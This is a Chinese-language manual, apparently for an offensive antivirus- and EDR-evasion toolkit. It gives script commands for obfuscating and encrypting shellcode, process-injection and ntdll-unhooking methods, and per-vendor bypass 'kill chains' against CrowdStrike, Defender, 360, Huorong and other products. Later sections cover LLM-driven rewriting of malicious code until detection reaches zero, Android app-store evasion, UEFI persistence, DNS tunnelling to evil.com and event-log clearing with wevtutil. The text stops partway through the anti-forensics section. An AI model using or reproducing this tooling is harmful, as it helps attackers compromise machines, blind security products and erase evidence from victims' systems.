## §1. SHELLCODE 处理流水线

### 1.1 指令级Patch (`shellcode-patch.py`)

对x86_64 Shellcode进行指令级修改，改变特征码但不改变功能：

- **同义指令替换**: `mov rax, 0` → `xor rax, rax` 等，基于Capstone反汇编引擎精确识别
- **花指令注入**: 17种花指令模板，包括条件跳转绕过、push/pop垃圾、无意义算术、浮点操作
- **指令重排**: 在基本块内交换独立指令（不共享寄存器/不影响控制流），约10%概率触发
- **可配置密度**: 花指令注入率0.0-0.5，默认0.15

```bash
python shellcode-patch.py shellcode.bin -o patched.bin          # 基本用法
python shellcode-patch.py shellcode.bin -j 0.3 -o patched.bin   # 高密度花指令
python shellcode-patch.py shellcode.bin -s 42 -o patched.bin    # 可复现结果
```

### 1.2 多层加密 (`shellcode-encrypt.py`)

三种加密模式，针对不同杀软场景：

**标准模式** — 四层加密引擎：

| 层 | 算法 | 类型 | 密钥长度 | 特点 |
|----|------|------|---------|------|
| 1 | ChaCha20 | 流密码 | 256-bit | 高性能，改变字节分布 |
| 2 | AES-256-GCM | 认证加密 | 256-bit | 防篡改，认证标签 |
| 3 | RC4 | 流密码 | 128-bit | 简单高效，二次混淆 |
| 4 | 自定义SM4 | 块密码 | 128-bit | 自定义S盒，不可识别 |

**卡巴斯基模式** (`--mode kaspersky`) — 分块RC4 + 密钥轮换：
- 每4096字节使用独立RC4密钥，防止内存扫描器匹配长特征
- 解密后立即重新加密，不留完整明文在内存中
- 与loader.c的`kasper_safe_sleep`无缝集成

**360 QVM模式** (`--mode qvm`) — 低熵值递增XOR：
- 熵值控制，模拟合法.rdata数据段分布
- 密钥嵌入为DJB2 API Hash值，兼容loader.c的`api_hash`动态解析
- 避免360 QVM的高熵检测

```bash
python shellcode-encrypt.py shellcode.bin -o encrypted.bin                        # 标准全层
python shellcode-encrypt.py shellcode.bin --mode kaspersky -o enc.bin -g decrypt.c # 卡巴斯基
python shellcode-encrypt.py shellcode.bin --mode qvm -o enc.bin -g decrypt.c       # 360 QVM
python shellcode-encrypt.py shellcode.bin -l chacha20,rc4,sm4 -g decrypt.c         # 自定义
```

### 1.3 多格式混淆 (`shellcode-obfuscate.py`)

八种混淆格式，支持多格式混和分块随机化：

| 格式 | 单元大小 | 解码函数 | 特征 |
|------|---------|---------|------|
| UUID | 16 bytes | UuidFromStringA | 最常见，伪装成GUID |
| IPv4 | 4 bytes | inet_addr | 伪装成IP地址列表 |
| IPv6 | 16 bytes | inet_pton | 比UUID更隐蔽 |
| MAC | 6 bytes | sscanf | 伪装成MAC地址 |
| GUID | 16 bytes | CLSIDFromString | 注册表格式 |
| Base64 | 全部 | CryptStringToBinaryA | 单字符串编码 |
| Word | 4 bytes | 自定义哈希 | 伪装成英文单词 |
| Decimal | 4 bytes | 直接转换 | 伪装成整数数组 |

**分块策略**: 默认16字节分块 → 随机打乱顺序 → 每块不同格式 → 运行时按order_map还原

```bash
python shellcode-obfuscate.py shellcode.bin -f uuid                    # 单一格式
python shellcode-obfuscate.py shellcode.bin -f uuid,ipv4,mac,base64    # 混合格式
python shellcode-obfuscate.py shellcode.bin -f uuid -g deobfuscate.c   # 生成C代码
```

---


## §2. LOADER 执行引擎

### 2.1 反沙箱检测 (18维加权评分系统)

针对微步云沙箱、360沙箱、卡巴斯基沙箱的18维检测矩阵：

```
加权评分体系 (总分≥8 → 沙箱 → 延迟60秒退出):

DIM1:  CPU核心数       < 4核        → +2分    DIM10: 显卡名称      VM/VBox     → +3分
DIM2:  物理内存         < 4GB        → +2分    DIM11: MAC地址前缀   VM前缀      → +3分
DIM3:  磁盘大小         < 80GB       → +2分    DIM12: 磁盘序列号    全0/全F     → +3分
DIM4:  系统运行时间     < 30分钟     → +2分    DIM13: 时间加速检测   加速        → +3分
DIM5:  鼠标移动         无移动       → +3分    DIM14: 反调试多维    PEB/DR/Flag → +3分
DIM6:  鼠标三角轨迹     共线         → +3分    DIM15: 注册表VM键    VMware/VBox → +2分
DIM7:  屏幕分辨率       < 1024×768   → +2分    DIM16: 窗口标题      分析工具    → +2分
DIM8:  桌面文件数       < 5个        → +2分    DIM17: 用户交互      无输入      → +3分
DIM9:  进程数量         < 50个       → +2分    DIM18: 条件延迟      CPU加速     → +3分

阈值: ≥8分 → 判定为沙箱，执行60秒无害操作后退出
```

### 2.2 DLL脱钩 (ntdll Unhooking)

```
流程:
  1. 获取已加载ntdll.dll的.text段地址和大小
  2. 从磁盘 C:\Windows\System32\ntdll.dll 读取干净副本
  3. 解析PE结构，提取.text段原始数据
  4. 修改已加载.text段的内存权限为 RWX
  5. 将干净数据覆盖到已加载的.text段
  6. 恢复原始内存权限
```

EDR的用户态hook通过修改`ntdll.dll`函数的前几个字节实现（inline hook），脱钩后EDR失去对关键API调用的监控能力。

### 2.3 ETW Patching + AMSI Bypass

**ETW双通道抑制**:
```
通道1: EtwEventWrite → xor rax, rax; ret  (用户态)
通道2: NtTraceEvent  → xor rax, rax; ret  (syscall态)
效果: 即使EDR恢复了EtwEventWrite，NtTraceEvent补丁继续生效
```

**AMSI Bypass — 硬件断点法 (推荐)**:
```
1. 在AmsiScanBuffer入口设置DR0硬件断点
2. 注册VEH异常处理器
3. 当AmsiScanBuffer被调用时触发EXCEPTION_SINGLE_STEP
4. VEH处理器修改RAX为AMSI_RESULT_CLEAN，直接返回
5. 优势: 不修改内存，不触发EDR内存完整性检测
```

### 2.4 间接Syscall (Halo's Gate)

```
Halo's Gate方案:
  1. 检查目标函数是否被hook (函数头是否以jmp开头)
  2. 如果被hook: 向上/向下搜索相邻未hook函数(间隔0x20字节)
  3. 通过相邻函数的SSN推算目标SSN (SSN连续排列)
  4. 跳转到ntdll中syscall;ret gadget的ret之后位置
  5. 调用栈看起来正常: 返回地址在ntdll合法范围内
```

### 2.5 BYOUD-Gap调用栈伪造 (v5.0核心)

```
原理: Bring Your Own User-mode Debugger — 利用模块间隙地址伪造合法调用栈
  1. byoud_init() → byoud_gap_scan_module() → 扫描kernel32/ntdll中代码间隙
  2. 间隙地址是模块内合法但未使用的空间，CET(Shadow Stack)兼容
  3. byoud_get_gap_frame(0) 获取第一个间隙作为返回地址
  4. 构造调用栈: 我们的代码 → kernel32间隙 → ntdll syscall
  5. EDR内核回调看到的栈帧全部在合法模块范围内

优势: 零修改CET兼容 (不修改任何模块代码段，纯地址利用)
```

### 2.6 VEH LayeredSyscall (v5.0核心)

```
原理: Vectorized Exception Handling + 硬件断点 = 透明Syscall代理
  1. veh_syscall_init() → 注册VEH处理器 + 在目标API入口设置硬件断点(DR0-DR3)
  2. 当被断点的API被调用时，触发EXCEPTION_SINGLE_STEP
  3. VEH处理器拦截: 提取SSN → 构造syscall帧 → 直接执行syscall
  4. 修改Context返回 → 原始调用者获得syscall结果
  5. 全程不修改目标API的任何字节 → EDR内存扫描无法检测

调用: veh_syscall_invoke(ssn, a1, a2, a3, a4) → 执行syscall
优势: 硬件级透明代理，EDR的inline hook完全失效
```

### 2.7 Heaven's Gate 天堂之门 (v5.0)

```
原理: WoW64进程中从32位模式切换到64位模式执行syscall
  1. 通过 far jump (0x33:label) 切换到64位代码段
  2. 在64位模式下直接执行syscall (避免WoW64层被EDR监控)
  3. 通过 far jump 返回32位模式
  4. 用于32位Loader绕过64位EDR监控
```

### 2.8 休眠混淆 (Ekko-style)

```
流程:
  1. 生成随机16字节密钥 (CryptGenRandom)
  2. 将Shellcode内存区域权限改为 RW
  3. XOR加密整个Shellcode区域
  4. 使用CreateWaitableTimer + SetWaitableTimer实现精确延迟
  5. 定时器到期后解密Shellcode
  6. 恢复内存权限为 RX

效果: 在休眠期间，EDR内存扫描看到的是加密数据，无法匹配特征码
变体: Ekko (Timer) / Zilean (SetTimer) / Foliage (SleepEx + APC)
```

### 2.9 环境密钥派生 (v3.0)

```
原理: 从目标机器环境信息派生解密密钥，只有正确环境才能解密payload

环境因子: hostname / domain / username / computer_sid / mac_address /
          disk_serial / product_name / timezone

密钥派生: HMAC-SHA256(salt, factor1 || factor2 || ...) → 32字节密钥
```

---


## §3. 高级注入技术

### 3.1 Process Ghosting (进程幽灵化)

```
1. 创建临时文件，写入恶意PE载荷
2. NtSetInformationFile → 标记文件为Delete-Pending
3. NtCreateSection → 从已标记删除的文件创建Image Section
4. NtCreateProcessEx → 从Section创建进程
5. 关闭文件句柄 → 文件从磁盘消失
6. EDR扫描文件时文件不存在 → 扫描失败
```

### 3.2 Process Parameter Poisoning (P³)

```
1. 创建挂起进程 (带大命令行缓冲区)
2. 读取PEB → ProcessParameters → CommandLine.Buffer
3. 将shellcode写入CommandLine缓冲区
4. 修改主线程Context (RIP → shellcode)
5. 恢复线程
绕过: 不使用VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
      CrowdStrike/SentinelOne/MDE/Cortex 四EDR均无法检测
```

### 3.3 Pool Party (线程池注入 · 8种变体)

```
TP_WORK:  覆写Worker Factory的start routine
TP_IO:    构造TP_IO结构体，通过文件关联触发
TP_WAIT:  插入TP_WAIT工作项到目标进程线程池
TP_ALPC:  ALPC消息到达触发
TP_TIMER: 定时器触发
TP_DIRECT:直接提交到线程池
TP_JOB:   Job对象关联
TP_CLEANUP_GROUP: Cleanup Group触发
优势: 不创建新线程 → 绕过NtCreateThreadEx内核回调
```

### 3.4 Threadless Injection (无线程注入)

```
1. Hook目标进程中的频繁调用API (如NtUserGetMessage)
2. 当合法线程调用该API时，hook触发
3. 劫持执行流 → 执行shellcode → 恢复执行流
4. 不创建线程 → 内核线程创建回调完全无感知

目标函数选择:
  - win32u.dll!NtUserGetMessage (GUI线程每秒调用数百次)
  - ntdll.dll!NtWaitForSingleObject (所有线程)
  - ntdll.dll!NtDelayExecution (Sleep线程)
```

### 3.5 模块践踏 + DLL代理注入 (v5.0)

```
模块践踏: 利用Windows Loader的DLL搜索顺序，将恶意DLL放置在合法路径之前
DLL代理: 创建代理DLL，转发所有导出函数到原始DLL，同时执行恶意逻辑
优势: Carbon Black / Defender 对合法模块加载的DLL信任度高
```

---


## §4. PE操作 + C2通信 + 多语言Loader

### 4.1 PE操作工具包 (`pe-toolkit.py`)

| 功能 | 命令 | 说明 |
|------|------|------|
| PE伪造 | `pe-toolkit.py fake input.exe --all` | 时间戳/链接器/区段名/Rich Header/校验和 |
| 代码洞 | `pe-toolkit.py codecave input.exe -s sc.bin` | 注入shellcode到PE空闲空间 |
| 新区段 | `pe-toolkit.py section input.exe -s sc.bin` | 添加含shellcode的新区段 |
| IAT代理 | `pe-toolkit.py iat-proxy input.exe` | 替换IAT为LoadLibrary+GetProcAddress |

### 4.2 C2通信辅助 (`c2-helper.py`)

```
功能:
  - 环境密钥派生 (hostname/domain/username/MAC/disk_serial)
  - 域前置 (Domain Fronting): Azure/Cloudfront/Google 域前置配置
  - DoH/DoT 隧道: 通过DNS-over-HTTPS/TLS隐蔽通信
  - Jitter模拟: 模拟正常用户行为的请求间隔随机化
  - 证书指纹: 自动生成自签名证书匹配目标域
```

### 4.3 多语言Loader对比

| 语言 | 编译工具 | 优势 | 劣势 | CET兼容 |
|------|---------|------|------|---------|
| C (MinGW) | x86_64-w64-mingw32-gcc | 最灵活，直接syscall | 需交叉编译 | ✓ (BYOUD-Gap) |
| Go (garble) | garble build | 自动混淆，二进制大 | 运行时特征 | 部分 |
| Nim | nim c --os:windows | 语法简洁，FFI强大 | 社区小 | 部分 |
| Rust | cargo build --release | 内存安全，零成本抽象 | 编译慢 | ✓ |

### 4.4 编译优化

```bash
# C (MinGW) — 去符号+资源伪造
x86_64-w64-mingw32-gcc loader.c -o loader.exe -s -O2 \
  -Wl,--subsystem,windows -lntdll -lkernel32 -luser32 \
  -Wl,--resource=version.rc  # 伪造Microsoft签名资源

# Go — garble混淆
garble -literals -tiny -seed=random build -ldflags="-s -w" -o loader.exe

# Nim — 去调试信息
nim c --os:windows --cpu:amd64 --app:gui --passL:-s \
  --dynlibOverride:ntdll -d:release loader.nim

# Rust — LTO + strip
cargo build --release --target x86_64-pc-windows-gnu
strip target/x86_64-pc-windows-gnu/release/loader.exe
```

---


## §5. 杀软专项绕过

### 5.1 杀软对抗矩阵 (v9.0 · 24+杀软/EDR)

| 杀软/EDR | 检测机制 | 绕过策略 | 核心脚本 |
|----------|---------|---------|---------|
| **CrowdStrike Falcon** | 用户态hook+内核回调+Indicators of Attack(IOA) | BYOUD-Gap+VEH双重绕过+IOA行为混淆 | `edr-killchain.py` |
| **SentinelOne** | 静态AI+行为AI+Storyline关联 | LLM语义重写+调用栈全合法+Storyline断裂 | `llm-obfuscator.py` |
| **Microsoft Defender** | AMSI+ETW+ASR+Attack Surface Reduction | 硬件断点AMSI+双通道ETW+ASR白名单利用 | `loader.c` |
| **Carbon Black** | 模块完整性+进程树分析+Reputation | 模块践踏+DLL代理+PPID伪造 | `pe-toolkit.py` |
| **DeepInstinct** | ML预测引擎+静态特征 | ML对抗引擎+PE头随机化+对抗样本生成 | `anti-ml.py` |
| **Cylance** | ML静态分析+熵值检测 | PE头随机化+熵值操控+代码洞注入 | `anti-ml.py` |
| **Kaspersky** | System Watcher行为分析+内存扫描 | 分块RC4+密钥轮换+kasper_safe_sleep | `shellcode-encrypt.py` |
| **ESET** | 高级启发式+反漏洞模块 | 代码虚拟化+控制流混淆+反反编译 | `loader.c` |
| **Bitdefender** | 沙箱+ML+行为监控 | 18维反沙箱+环境密钥+延迟执行 | `sandbox-evasion.py` |
| **Trend Micro** | 行为检测+Web信誉 | LOLBin代理+域前置+信誉白名单 | `lolbin-helper.py` |
| **Sophos** | CryptoGuard+行为分析 | 加密API调用+行为分片+时间分散 | `loader.c` |
| **McAfee** | Real Protect+行为AI | 进程幽灵化+P³+线程池注入 | `shellcode-loader-injector.py` |

### 5.2 国产三巨头专项绕过 (v8.0核心)

#### 5.2.1 360安全卫士全引擎绕过 (`360-bypass.py`)

| 引擎 | 检测机制 | 绕过策略 |
|------|---------|---------|
| 云查杀 | 文件哈希+特征码云端比对 | PE头随机化+代码洞+熵值控制 |
| 晶核引擎 | 本地ML模型+行为预判 | 对抗样本+LLM语义重写 |
| QVM引擎 | 启发式分析+熵值检测 | 低熵值XOR+DJB2 API Hash密钥 |
| 主动防御 | API调用序列监控 | 间接Syscall+VEH LayeredSyscall |
| 核晶引擎 | 硬件级虚拟化监控 | BYOUD-Gap+Heaven's Gate |
| HIPS | 注册表/文件/进程保护规则 | 内核回调枚举+驱动补丁 |
| 行为分析 | 进程行为链分析 | 行为分片+时间分散+LOLBin代理 |
| 文件监控 | 文件创建/修改实时监控 | Process Ghosting+文件消失 |
| 流量监控 | 网络流量DPI | 隐蔽信道(DNS/ICMP/QUIC) |
| 沙箱 | 云端沙箱动态分析 | 18维反沙箱+环境密钥+延迟执行 |

#### 5.2.2 火绒安全全模块绕过 (`huorong-bypass.py`)

| 模块 | 检测机制 | 绕过策略 |
|------|---------|---------|
| HIPS | 行为规则+进程保护 | 内核回调枚举+PatchGuard兼容绕过 |
| 文件监控 | 实时文件扫描 | Process Ghosting+NTFS ADS隐藏 |
| 行为分析 | 行为链关联分析 | 行为分片+LOLBin链式代理 |
| 内存扫描 | 定期内存特征扫描 | 休眠混淆+分块加密+VAD操纵 |
| 注册表监控 | 敏感键值变更通知 | 内核回调绕过+DirectRegistryWrite |
| 进程保护 | 关键进程注入检测 | 无线程注入+Pool Party |
| 网络防护 | 网络连接监控 | 域前置+DoH隧道+QUIC |
| 火绒剑 | 系统诊断工具检测 | DKOM+PEB操纵+反调试 |
| 自定义规则 | 用户自定义防护规则 | 规则探测+动态行为适配 |
| 漏洞防护 | Exploit防护(EMET+) | ROP链随机化+CFG兼容 |

#### 5.2.3 腾讯电脑管家全模块绕过 (`tencent-bypass.py`)

| 模块 | 检测机制 | 绕过策略 |
|------|---------|---------|
| 云查杀 | TAV云引擎+本地特征 | PE伪装+代码洞+LLM重写 |
| TAV引擎 | 本地ML+启发式 | 对抗样本+熵值控制 |
| 主动防御 | API Hook+行为监控 | VEH LayeredSyscall+间接Syscall |
| 文件监控 | 实时文件扫描 | NTFS事务+Process Ghosting |
| 进程防护 | 进程创建/注入检测 | PPID伪造+Pool Party注入 |
| 网页监控 | 浏览器保护+钓鱼检测 | WebView注入+合法域利用 |
| USB防护 | 移动存储监控 | 内存加载+无文件落地 |
| 管家锁 | 系统保护+自保护 | BYOVD辅助+驱动级绕过 |
| 沙箱 | 云端沙箱分析 | 18维反沙箱+环境指纹 |
| 云安全 | 信誉系统+URL过滤 | 域前置+白名单域利用 |
| 驱动级 | 内核驱动保护 | BYOVD+驱动签名伪造 |
| 自保护 | 进程守护+防终止 | 内核回调补丁+DKOM |

#### 5.2.4 三巨头联合绕过策略

```
统一云查杀绕过:
  1. PE头随机化: 时间戳/链接器版本/区段名/校验和 全部伪造
  2. 熵值控制: 加密后熵值控制在6.5-7.2之间 (合法PE范围)
  3. 代码洞注入: Shellcode嵌入PE对齐空隙，不增加文件大小
  4. 签名伪造: 复制合法Microsoft签名的证书结构

统一内核回调补丁:
  1. 枚举 PsSetCreateProcessNotifyRoutine 注册的回调
  2. 枚举 PsSetCreateThreadNotifyRoutine 注册的回调
  3. 枚举 PsSetLoadImageNotifyRoutine 注册的回调
  4. BYOVD驱动加载 → 内存中Patch回调数组 → 恢复原始驱动签名

厂商专项适配:
  360: 重点绕过QVM熵值检测 + 晶核ML模型 → 低熵加密+对抗样本
  火绒: 重点绕过HIPS行为规则 + 内存扫描 → 行为分片+休眠混淆
  管家: 重点绕过TAV引擎 + 自保护机制 → LLM重写+BYOVD
```

---


## §6. 高级对抗技术 (v5.0-v7.0)

### 6.1 ML对抗引擎 (`anti-ml.py`)

```
原理: 针对DeepInstinct/Cylance等ML静态分析引擎的对抗

技术栈:
  1. PE头随机化: 随机化TimeDateStamp/PointerToSymbolTable/Characteristics
  2. 熵值操控: 注入低熵填充数据，使整体熵值落入合法区间
  3. 对抗样本生成: 利用ML模型梯度方向生成对抗扰动
  4. DLL代理注入: 通过合法DLL代理加载恶意逻辑
  5. 特征空间偏移: 在PE特征空间中移动到决策边界另一侧
```

### 6.2 内核回调绕过 (`kernel-bypass.py`)

```
原理: EDR通过内核回调监控进程/线程/镜像加载

绕过路径:
  1. 回调枚举: 遍历 PspCreateProcessNotifyRoutine 数组
  2. BYOVD辅助: 利用合法签名驱动的漏洞加载自定义驱动
  3. 驱动补丁: 在内存中将EDR回调函数替换为ret
  4. PatchGuard兼容: 使用DPC定时器延迟Patch，避开PatchGuard检查周期
  5. 替代路径: 直接Syscall + 不触发回调的API组合
```

### 6.3 LLM语义级代码重写 (`llm-obfuscator.py`)

```
原理: 利用LLM对恶意代码进行语义等价重写，改变所有表面特征

流程:
  1. 提取原始代码的AST (抽象语法树)
  2. 将AST节点映射为自然语言描述
  3. 通过LLM生成语义等价但语法完全不同的代码
  4. 编译验证功能一致性
  5. 循环迭代直到杀软检测率降至0

风格转换模板:
  - 学术风格: 变量名→论文命名法，注释→学术引用
  - 游戏引擎风格: 代码结构→ECS模式，命名→游戏术语
  - 企业框架风格: 伪装为Spring/ASP.NET代码结构
```

### 6.4 C2全协议框架 (`c2-framework.py`)

| 协议 | 端口 | 隐蔽性 | 速度 | 适用场景 |
|------|------|--------|------|---------|
| HTTP/2 | 443 | 中 | 快 | 通用场景 |
| HTTP/3 QUIC | 443/UDP | 高 | 最快 | WAF绕过 |
| WebSocket | 443 | 高 | 快 | 长连接C2 |
| DoH | 443 | 极高 | 慢 | 隐蔽通信 |
| DoT | 853 | 高 | 中 | DNS隧道 |
| ICMP | — | 高 | 慢 | 防火墙穿透 |
| 域前置 | 443 | 极高 | 快 | 高级隐蔽 |

### 6.5 EDR专项杀伤链 (`edr-killchain.py`)

```
CrowdStrike Falcon 杀伤链:
  1. 检测CsAgent.exe进程 → 识别Falcon安装
  2. 枚举用户态hook: ntdll!NtAllocateVirtualMemory 前5字节
  3. BYOUD-Gap栈伪造 → 调用栈返回地址全部在kernel32间隙
  4. VEH LayeredSyscall → 绕过hook直接syscall
  5. ETW Patch → 切断遥测
  6. 内核回调枚举 → Patch Falcon回调
  7. 行为混淆 → IOA规则匹配率降至0

SentinelOne 杀伤链:
  1. 检测SentinelAgent.exe → 识别SentinelOne安装
  2. Storyline关联分析 → 需要断裂事件链
  3. LLM语义重写 → 代码特征完全改变
  4. 调用栈全合法 → BYOUD-Gap+VEH双重伪造
  5. 行为分片 → 跨进程分散恶意行为
  6. 时间分散 → 行为间隔>30min，断裂Storyline

Microsoft Defender 杀伤链:
  1. 检测MsMpEng.exe → 识别Defender活跃
  2. AMSI硬件断点 → VEH拦截AmsiScanBuffer
  3. ETW双通道Patch → EtwEventWrite + NtTraceEvent
  4. ASR白名单利用 → 利用受信任应用路径
  5. Tamper Protection绕过 → 安全模式/离线操作

Carbon Black 杀伤链:
  1. 检测cb.exe/cb.comms → 识别CB安装
  2. 模块完整性检查 → 模块践踏绕过
  3. 进程树分析 → PPID伪造+explorer.exe父进程
  4. Reputation检查 → 白名单域+合法签名
  5. DLL代理注入 → 通过合法DLL加载

DeepInstinct 杀伤链:
  1. 检测DIPreventionService → 识别DeepInstinct
  2. ML预测引擎 → 对抗样本生成
  3. 静态特征分析 → PE头随机化+熵值操控
  4. 行为预测 → 行为分片+LOLBin代理

Cylance 杀伤链:
  1. 检测CylanceSvc → 识别Cylance安装
  2. ML静态分析 → 对抗样本+特征空间偏移
  3. 熵值检测 → 熵值操控至合法区间
  4. 代码洞注入 → 不增加文件大小

ESET 杀伤链:
  1. 检测ekrn.exe → 识别ESET安装
  2. 高级启发式 → 代码虚拟化+控制流混淆
  3. 反漏洞模块 → ROP链随机化+CFG兼容
  4. 内存保护 → 休眠混淆+VAD操纵
```

### 6.6 LOLBin全库 (31条目 · `lolbin-helper.py`)

```
签名二进制代理执行 (部分列表):

| 二进制 | 路径 | 用途 | 签名 |
|--------|------|------|------|
| rundll32.exe | System32 | DLL加载执行 | Microsoft |
| mshta.exe | System32 | HTA脚本执行 | Microsoft |
| regsvr32.exe | System32 | COM DLL注册/执行 | Microsoft |
| certutil.exe | System32 | 文件下载/编码 | Microsoft |
| msbuild.exe | VS/WinSDK | C#代码编译执行 | Microsoft |
| installutil.exe | .NET Framework | .NET程序安装/执行 | Microsoft |
| regasm.exe | .NET Framework | COM注册/.NET执行 | Microsoft |
| cmstp.exe | System32 | INF文件执行 | Microsoft |
| msconfig.exe | System32 | 系统配置→DLL加载 | Microsoft |
| wmic.exe | System32 | WMI命令执行 | Microsoft |
| bitsadmin.exe | System32 | BITS任务下载 | Microsoft |
| presentationhost.exe | System32 | XAML浏览器应用 | Microsoft |
| xwizard.exe | System32 | COM对象执行 | Microsoft |
| forfiles.exe | System32 | 命令代理执行 | Microsoft |
| syncappvpublishingserver.exe | System32 | PowerShell代理 | Microsoft |
| ... 共31条目 |

使用: python lolbin-helper.py --exec rundll32 --payload payload.dll
```

### 6.7 内存取证规避 (`mem-forensics-evasion.py`)

```
反 Volatility:
  1. DKOM: 直接操作内核对象，从EPROCESS链中摘除进程
  2. VAD操纵: 修改Virtual Address Descriptor隐藏恶意内存
  3. PEB操纵: 修改进程环境块中的模块列表
  4. Handle Table: 清除恶意句柄引用

反 MemProcFS:
  1. 文件less执行: 内存中直接映射PE，无文件落地
  2. Named Pipe隐蔽: 使用随机管道名避免枚举
  3. 线程栈清理: 执行后清除线程栈中的敏感数据

反 DumpIt/Memoryze:
  1. 页面交换规避: 锁定恶意内存页面不被换出
  2. 大页内存: 使用Large Page分配，某些dump工具跳过
  3. 时间窗口: 在取证工具运行前自动清理
```

### 6.8 供应链攻击 (`supply-chain.py`)

```
DLL侧加载:
  1. 找到合法签名二进制 (如Windows Defender的MpCmdRun.exe)
  2. 分析其DLL依赖链
  3. 将恶意DLL放置在二进制搜索路径中
  4. 合法二进制加载恶意DLL → 签名不变

COM劫持:
  1. 修改HKCU\Software\Classes\CLSID\{target}
  2. 指向恶意InprocServer32
  3. 当任何程序CoCreateInstance时加载恶意DLL

WMI持久化:
  1. 创建WMI事件过滤器: 系统启动/进程创建/定时触发
  2. 绑定WMI事件消费者: 执行恶意脚本/命令行
  3. 无文件落地 → 仅存在于WMI仓库

注册表持久化:
  1. Run/RunOnce键: 用户登录时执行
  2. Image File Execution Options: 调试器劫持
  3. AppInit_DLLs: 注入到所有GUI进程
  4. SilentProcessExit: 进程退出时触发
```

---


## §7. ANDROID APK 免杀 (v7.0)

### 7.1 APK混淆引擎 (`apk-obfuscator.py`)

```
6大混淆模块:

1. DEX混淆:
   - 类名/方法名/字段名 → Unicode同形异义字符 (如 latin → latіn)
   - 控制流平坦化: switch-case分发器 + 状态变量
   - 不透明谓词: if(x*2-x-x == 0) 永远为true但静态分析困难
   - 字符串加密: AES-128-CBC + 运行时解密

2. Manifest混淆:
   - 组件名Unicode替换
   - 权限声明重组
   - meta-data注入垃圾数据

3. 资源混淆:
   - 资源ID重映射
   - 无用资源注入 (增大APK体积)
   - 图片资源隐写

4. SO库混淆:
   - ELF符号表strip
   - GOT/PLT重定向
   - 字符串加密+运行时解密

5. 字符串混淆:
   - 反射调用替代直接引用
   - 字符串分片+运行时拼接
   - Base64+XOR双重编码

6. 控制流混淆:
   - 基本块拆分+随机跳转
   - 虚假分支注入
   - 循环展开+折叠
```

### 7.2 APK免杀对抗 (`apk-evasion.py`)

```
7大绕过目标:

1. Google Play Protect:
   - 签名方案v3+ 签名伪造
   - DEX代码拆分: 核心逻辑在native层
   - 动态加载: 首版无害→运行时下载恶意DEX
   - 行为检测绕过: 延迟触发+环境检测

2. 华为安全引擎:
   - HarmonyOS兼容性伪装
   - 华为应用市场审核绕过
   - 厂商预装信任利用

3. 小米安全引擎:
   - MIUI安全组件检测绕过
   - 小米应用商店审核绕过
   - 系统级权限利用

4. OPPO/vivo安全引擎:
   - ColorOS/OriginOS 安全组件绕过
   - 厂商特定权限模型利用

5. 沙箱检测:
   - 18维反沙箱 (移植PC版+Android适配)
   - 模拟器检测: CPUID/设备指纹/传感器矩阵
   - Frida/Xposed检测: 端口扫描+内存特征+符号检测

6. 反调试:
   - PTRACE反调试: 自占ptrace端口
   - JDWP断点检测: 扫描调试器断点特征
   - 时间差检测: RDTSC/系统时钟差异

7. 运行时完整性:
   - SELinux策略探测
   - dm-verity状态检查
   - SafetyNet/Play Integrity 绕过
```

### 7.3 APK加固引擎 (`apk-packer.py`)

```
6大加固模块:

1. DEX VMP (虚拟机保护):
   - 自定义字节码指令集 (200+指令)
   - 虚拟机解释器: switch-dispatcher / threaded code
   - 关键函数编译为VMP bytecode → 反编译不可逆

2. 函数抽取:
   - 将DEX中的方法体抽取到native层
   - DEX中仅保留stub → 运行时通过JNI调用native
   - native层通过mmap动态还原方法体

3. 多DEX拆分:
   - 将代码分散到多个DEX文件
   - 运行时动态加载+内存合并
   - 增加静态分析难度

4. SO库加固:
   - ELF文件加密 (AES-256-GCM)
   - 运行时解密+内存加载
   - .init_array 中执行解密逻辑

5. 壳程序:
   - Application子类替换
   - attachBaseContext中解密+加载原始DEX
   - 反射还原原始Application

6. 资源保护:
   - 资源文件加密
   - 运行时解密加载
   - 防止apktool直接解包
```

### 7.4 Android原生Loader (`android-loader.c`)

```c
// 核心特性:
// 1. JNI层直接syscall (绕过Java层hook)
// 2. 内存中加载ELF (无文件落地)
// 3. PTRACE反调试
// 4. SELinux上下文伪装

// 关键函数:
// native_init()     → JNI初始化 + 环境检测
// native_load()     → 内存ELF加载器
// native_inject()   → PTRACE注入目标进程
// native_hide()     → 进程隐藏 (从/proc消失)
// native_c2()       → C2通信 (DNS/ICMP/HTTPS)
```

---


## §8. 高级基础设施对抗 (v7.0)

### 8.1 虚拟化层检测绕过 (`hypervisor-evasion.py`)

```
6大平台检测与绕过:

| 平台 | 检测特征 | 绕过策略 |
|------|---------|---------|
| VMware | CPUID leaf 0x40000000 "VMwareVMware" | CPUID结果拦截+伪造 |
| VirtualBox | PCI设备ID 0x80EE/0xCAFE | I/O端口拦截 |
| Hyper-V | 分区ID + VP指数 | 嵌套虚拟化 |
| KVM | CPUID "KVMKVMKVM\0\0\0" | MSR Patch |
| QEMU | 设备指纹 (磁盘/网卡/显卡) | 设备模型替换 |
| 沙箱 | 综合环境指纹 | 18维反沙箱+环境密钥 |
```

### 8.2 固件级持久化 (`firmware-persistence.py`)

```
6大持久化模块:

1. UEFI DXE驱动: 写入SPI Flash → 每次启动加载
2. SMM (System Management Mode): 最高特权级代码，OS无法检测
3. NVRAM变量: 存储在UEFI NVRAM中，重装系统不消失
4. Secure Boot绕过: 替换PK/KEK/db密钥
5. ACPI持久化: 恶意ACPI表 → OS加载时执行
6. Option ROM: 网卡/显卡固件植入
```

### 8.3 隐蔽信道 (`network-covert.py`)

```
6种隐蔽信道:

1. DNS隧道:
   - 域名查询编码数据: payload → base32 → subdomain.evil.com
   - 支持TXT/NULL/CNAME/A记录
   - 速率控制: 避免DNS监控检测

2. ICMP隧道:
   - Echo Request/Reply载荷编码数据
   - 伪装正常ping流量
   - 自适应MTU分片

3. QUIC隐蔽:
   - HTTP/3 QUIC 0-RTT连接
   - 加密传输，中间设备无法DPI
   - 端口443/UDP 伪装正常HTTPS

4. 协议隐写:
   - HTTP头隐写: 利用Accept-Language/Cookie等头编码数据
   - TLS扩展隐写: 在ClientHello扩展中嵌入数据
   - 图片隐写: LSB编码到上传的头像/图片中

5. DGA (Domain Generation Algorithm):
   - 基于日期+种子域名生成算法
   - 每日变换C2域名
   - 结合Telegram Bot作为备用C2

6. 多级代理:
   - Telegram Bot → 中转服务器 → 目标
   - Tor → I2P → 目标
   - 云函数 (AWS Lambda / Cloudflare Workers) 中继
```

### 8.4 反取证 (`anti-forensics.py`)

```
7大反取证模块:

1. EventLog清除:
   - wevtutil cl Security/System/Application
